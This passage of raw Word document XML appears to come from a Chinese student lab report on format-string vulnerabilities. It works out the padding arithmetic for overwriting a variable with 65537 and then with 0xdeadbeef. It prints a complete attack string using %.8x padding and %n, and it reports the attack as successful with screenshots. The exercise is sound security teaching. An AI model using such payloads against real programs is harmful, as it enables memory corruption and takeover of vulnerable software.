      </w:ins>
    </w:p>
    <w:p w14:paraId="77725977" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRPr="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="54" w:author="zhao ruizhi" w:date="2023-05-08T14:44:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
          <w:rPrChange w:id="55" w:author="zhao ruizhi" w:date="2023-05-08T14:44:00Z">
            <w:rPr>
              <w:ins w:id="56" w:author="zhao ruizhi" w:date="2023-05-08T14:44:00Z"/>
              <w:lang w:eastAsia="zh-CN"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>请利用格式化字符串漏洞，修改v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>ar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>变量的数值为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>65537</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78DF293B" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRPr="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="57" w:author="zhao ruizhi" w:date="2023-05-08T15:33:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
          <w:rPrChange w:id="58" w:author="zhao ruizhi" w:date="2023-05-08T15:53:00Z">
            <w:rPr>
              <w:ins w:id="59" w:author="zhao ruizhi" w:date="2023-05-08T15:33:00Z"/>
              <w:lang w:eastAsia="zh-CN"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="60" w:author="zhao ruizhi" w:date="2023-05-08T15:33:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>考虑</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="61" w:author="zhao ruizhi" w:date="2023-05-08T15:51:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>整体修改</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="62" w:author="zhao ruizhi" w:date="2023-05-08T15:33:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>：</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="63" w:author="zhao ruizhi" w:date="2023-05-08T15:51:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>（</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>逐字节</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="64" w:author="zhao ruizhi" w:date="2023-05-08T16:05:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>难以</w:t>
        </w:r>
      </w:ins>
      <w:proofErr w:type="gramEnd"/>
      <w:ins w:id="65" w:author="zhao ruizhi" w:date="2023-05-08T15:51:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>使用的原因是需要修改的值转换为字节后太小了</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="66" w:author="zhao ruizhi" w:date="2023-05-08T15:53:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>：</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>65537 = 0x10001</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="67" w:author="zhao ruizhi" w:date="2023-05-08T15:51:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
            <w:rPrChange w:id="68" w:author="zhao ruizhi" w:date="2023-05-08T15:53:00Z">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:lang w:eastAsia="zh-CN"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:t>）</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="243DB824" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="69" w:author="zhao ruizhi" w:date="2023-05-08T15:56:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="70" w:author="zhao ruizhi" w:date="2023-05-08T15:33:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>前面需要输出的字符数=</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="71" w:author="zhao ruizhi" w:date="2023-05-08T15:52:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>4</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="72" w:author="zhao ruizhi" w:date="2023-05-08T15:33:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t xml:space="preserve"> + 5 * 8 = </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="73" w:author="zhao ruizhi" w:date="2023-05-08T15:52:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>44</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6ECE12B8" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="74" w:author="zhao ruizhi" w:date="2023-05-08T15:33:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="75" w:author="zhao ruizhi" w:date="2023-05-08T15:56:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>再补：6</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>5537 – 44 = 65493</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="76" w:author="zhao ruizhi" w:date="2023-05-08T16:05:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>个字符</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="72B10E48" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="77" w:author="zhao ruizhi" w:date="2023-05-08T15:33:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="78" w:author="zhao ruizhi" w:date="2023-05-08T15:33:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>攻击字符串如下：</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0D7DE0A9" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1282" w:firstLine="0"/>
        <w:rPr>
          <w:ins w:id="79" w:author="zhao ruizhi" w:date="2023-05-08T15:55:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="80" w:author="zhao ruizhi" w:date="2023-05-08T15:33:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>\x4</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="81" w:author="zhao ruizhi" w:date="2023-05-08T15:55:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>8</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="82" w:author="zhao ruizhi" w:date="2023-05-08T15:33:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>\xd0\</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>xff</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>\xff%.8x%.8x%.8x%.8x%.8x%.</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="83" w:author="zhao ruizhi" w:date="2023-05-08T15:57:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>65493</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="84" w:author="zhao ruizhi" w:date="2023-05-08T15:33:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>x%n</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="31207AA7" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="85" w:author="zhao ruizhi" w:date="2023-05-08T15:33:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="86" w:author="zhao ruizhi" w:date="2023-05-08T15:33:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>攻击成功：</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="460E288B" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1282" w:firstLine="0"/>
        <w:rPr>
          <w:ins w:id="87" w:author="zhao ruizhi" w:date="2023-05-08T16:03:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="88" w:author="zhao ruizhi" w:date="2023-05-08T16:02:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:noProof/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="591C99A8" wp14:editId="393F94AE">
              <wp:extent cx="5274310" cy="2896870"/>
              <wp:effectExtent l="0" t="0" r="2540" b="0"/>
              <wp:docPr id="1355677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77617" name="图片 1"/>
                      <pic:cNvPicPr>
                        <a:picLocks noChangeAspect="1"/>
                      </pic:cNvPicPr>
                    </pic:nvPicPr>
                    <pic:blipFill>
                      <a:blip r:embed="rId23"/>
                      <a:stretch>
                        <a:fillRect/>
                      </a:stretch>
                    </pic:blipFill>
                    <pic:spPr>
                      <a:xfrm>
                        <a:off x="0" y="0"/>
                        <a:ext cx="5274310" cy="2896870"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2836281A" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRPr="00193C1A" w:rsidRDefault="00000000" w:rsidP="00193C1A">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1282" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:rPrChange w:id="89" w:author="zhao ruizhi" w:date="2023-05-08T15:33:00Z">
            <w:rPr>
              <w:lang w:eastAsia="zh-CN"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:pPrChange w:id="90" w:author="zhao ruizhi" w:date="2023-05-08T15:33:00Z">
          <w:pPr>
            <w:pStyle w:val="af2"/>
            <w:numPr>
              <w:numId w:val="6"/>
            </w:numPr>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:ind w:left="842" w:hanging="360"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="91" w:author="zhao ruizhi" w:date="2023-05-08T16:03:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:noProof/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="57379819" wp14:editId="0AD2DC77">
              <wp:extent cx="5274310" cy="394970"/>
              <wp:effectExtent l="0" t="0" r="2540" b="5080"/>
              <wp:docPr id="415869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69125" name="图片 1"/>
                      <pic:cNvPicPr>
                        <a:picLocks noChangeAspect="1"/>
                      </pic:cNvPicPr>
                    </pic:nvPicPr>
                    <pic:blipFill>
                      <a:blip r:embed="rId24"/>
                      <a:stretch>
                        <a:fillRect/>
                      </a:stretch>
                    </pic:blipFill>
                    <pic:spPr>
                      <a:xfrm>
                        <a:off x="0" y="0"/>
                        <a:ext cx="5274310" cy="394970"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="40AD2B7C" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRPr="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="92" w:author="zhao ruizhi" w:date="2023-05-08T14:44:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
          <w:rPrChange w:id="93" w:author="zhao ruizhi" w:date="2023-05-08T14:44:00Z">
            <w:rPr>
              <w:ins w:id="94" w:author="zhao ruizhi" w:date="2023-05-08T14:44:00Z"/>
              <w:lang w:eastAsia="zh-CN"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>请利用格式化字符串漏洞，修改var变量的数值为0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>xdeadbeef</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E6A1D2C" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000" w:rsidP="00193C1A">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="95" w:author="zhao ruizhi" w:date="2023-05-08T15:00:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:pPrChange w:id="96" w:author="zhao ruizhi" w:date="2023-05-08T15:02:00Z">
          <w:pPr>
            <w:pStyle w:val="af2"/>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:ind w:left="842" w:firstLine="0"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="97" w:author="zhao ruizhi" w:date="2023-05-08T14:59:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>考虑选择</w:t>
        </w:r>
      </w:ins>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="98" w:author="zhao ruizhi" w:date="2023-05-08T15:00:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>逐字节</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>修改：</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="57EDF4C1" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000" w:rsidP="00193C1A">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="99" w:author="zhao ruizhi" w:date="2023-05-08T15:02:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:pPrChange w:id="100" w:author="zhao ruizhi" w:date="2023-05-08T15:02:00Z">
          <w:pPr>
            <w:pStyle w:val="af2"/>
            <w:numPr>
              <w:numId w:val="7"/>
            </w:numPr>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:ind w:left="1282" w:hanging="440"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="101" w:author="zhao ruizhi" w:date="2023-05-08T15:01:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>前面</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="102" w:author="zhao ruizhi" w:date="2023-05-08T15:02:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>需要输出的字符数=</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t xml:space="preserve">4 * </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="103" w:author="zhao ruizhi" w:date="2023-05-08T15:29:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>(</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="104" w:author="zhao ruizhi" w:date="2023-05-08T15:02:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>4 + 3</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="105" w:author="zhao ruizhi" w:date="2023-05-08T15:29:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>)</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="106" w:author="zhao ruizhi" w:date="2023-05-08T15:02:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t xml:space="preserve">+ </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="107" w:author="zhao ruizhi" w:date="2023-05-08T15:27:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>5</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="108" w:author="zhao ruizhi" w:date="2023-05-08T15:02:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t xml:space="preserve"> * 8 = 28 + 32 = 6</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="109" w:author="zhao ruizhi" w:date="2023-05-08T15:27:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>8</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5ED36CCC" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="110" w:author="zhao ruizhi" w:date="2023-05-08T15:04:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="111" w:author="zhao ruizhi" w:date="2023-05-08T15:02:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>0</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>x</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="112" w:author="zhao ruizhi" w:date="2023-05-08T15:03:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t xml:space="preserve">ad </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>&lt;</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t xml:space="preserve"> 0xbe &lt; 0xde &lt; 0xef</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7001C265" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="113" w:author="zhao ruizhi" w:date="2023-05-08T15:06:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="114" w:author="zhao ruizhi" w:date="2023-05-08T15:04:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>因为v</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>ar</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>的地址为ffff</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>d048</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="115" w:author="zhao ruizhi" w:date="2023-05-08T15:06:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>，可知：</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0E8B994D" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1722" w:firstLine="0"/>
        <w:rPr>
